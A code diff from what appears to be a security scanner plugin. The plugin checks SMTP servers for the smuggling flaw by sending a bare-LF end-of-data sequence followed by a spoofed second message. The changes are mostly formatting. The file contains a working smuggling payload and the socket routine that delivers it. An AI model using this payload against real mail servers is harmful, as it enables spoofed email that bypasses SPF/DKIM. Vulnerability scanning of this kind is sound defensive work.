@@ -7,11 +7,12 @@ Exploits End-of-Data sequence parsing differences (<CR><LF>.<CR><LF> vs <LF>.<LF
 to smuggle a secondary, spoofed email bypassing SPF/DKIM validation.
 """
 
-import socket
 import logging
-from typing import Optional, Dict, Any
+import socket
+from typing import Any
 
 logger = logging.getLogger("Cascavel.Plugins.SMTPSmuggling")
+
 
 def test_smtp_smuggling_sequence(target_ip: str, port: int = 25, timeout: int = 5) -> tuple[bool, str]:
     """
@@ -19,28 +20,24 @@ def test_smtp_smuggling_sequence(target_ip: str, port: int = 25, timeout: int = 
     using non-standard End-of-Data sequences.
     Returns (is_vulnerable, evidence).
     """
-    # Using typical testing domains. In a real red-team scenario, 
+    # Using typical testing domains. In a real red-team scenario,
     # these would be mapped to the target's actual domains.
     sender = "test@cascavel-scanner.local"
     recipient = "postmaster@cascavel-scanner.local"
-    
+
     # The smuggling payload. We simulate the end of the first message
     # using <LF>.<LF> instead of <CR><LF>.<CR><LF>, followed by the smuggled message.
     # If the outbound server treats <LF>.<LF> as just text, but the inbound server
     # treats it as End-of-Data, the second message is smuggled.
-    
+
     # Message 1 (Legitimate)
     msg1_data = (
-        f"From: {sender}\r\n"
-        f"To: {recipient}\r\n"
-        "Subject: Legitimate Message\r\n"
-        "\r\n"
-        "This is the legitimate message body."
+        f"From: {sender}\r\nTo: {recipient}\r\nSubject: Legitimate Message\r\n\r\nThis is the legitimate message body."
     )
-    
+
     # The Smuggling Sequence: <LF>.<LF> or <CR>.<CR>
     smuggling_sequence = "\n.\n"
-    
+
     # Message 2 (Smuggled / Spoofed)
     smuggled_data = (
         "mail FROM:<admin@cascavel-scanner.local>\r\n"
@@ -53,15 +50,16 @@ def test_smtp_smuggling_sequence(target_ip: str, port: int = 25, timeout: int = 
         "This is the smuggled message, bypassing SPF/DKIM.\r\n"
         ".\r\n"
     )
-    
+
     payload = msg1_data + smuggling_sequence + smuggled_data
-    
+
     try:
         with socket.create_connection((target_ip, port), timeout=timeout) as sock:
+
             def recv_response():
                 try:
-                    return sock.recv(1024).decode('utf-8', errors='ignore')
-                except socket.timeout:
+                    return sock.recv(1024).decode("utf-8", errors="ignore")
+                except TimeoutError:
                     return ""
 
             # 1. Receive Banner
@@ -95,13 +93,13 @@ def test_smtp_smuggling_sequence(target_ip: str, port: int = 25, timeout: int = 
 
             # 6. Send the smuggling payload
             sock.sendall(payload.encode())
-            
+
             # 7. Receive response for the payload
             # If the server is vulnerable, it might process the smuggled MAIL FROM
             # and return a 250 OK for the smuggled message, or process it silently.
             # We look for indications that the smuggled commands were parsed.
             final_resp = recv_response()
-            
+
             # Strict validation: The server must accept the data.
             # If it throws a 500 error (unrecognized command) for the smuggled part,
             # it means the smuggling sequence failed and the commands were treated as body text.
@@ -111,15 +109,15 @@ def test_smtp_smuggling_sequence(target_ip: str, port: int = 25, timeout: int = 
                 sock.sendall(b"QUIT\r\n")
                 quit_resp = recv_response()
                 if "221" in quit_resp:
-                     return True, f"Server accepted <LF>.<LF> end-of-data sequence. Final response: {final_resp.strip()}"
+                    return True, f"Server accepted <LF>.<LF> end-of-data sequence. Final response: {final_resp.strip()}"
 
     except Exception as e:
         logger.debug(f"SMTP Smuggling check failed on {target_ip}:{port}: {e}")
-        
+
     return False, ""
 
 
-def run(target: str, ip: str, ports: list, banners: dict) -> Optional[Dict[str, Any]]:
+def run(target: str, ip: str, ports: list, banners: dict) -> dict[str, Any] | None:
     """
     Checks for SMTP Smuggling vulnerabilities.
     """
@@ -136,7 +134,7 @@ def run(target: str, ip: str, ports: list, banners: dict) -> Optional[Dict[str, 
     # Common SMTP ports
     smtp_ports = [25, 465, 587, 2525]
     open_smtp_ports = [p for p in ports if p in smtp_ports]
-    
+
     if not open_smtp_ports:
         return None
 
@@ -148,7 +146,7 @@ def run(target: str, ip: str, ports: list, banners: dict) -> Optional[Dict[str, 
                 "severity": severity,
                 "description": description,
                 "endpoint": f"smtp://{target}:{port}",
-                "evidence": evidence
+                "evidence": evidence,
             }
 
     return None
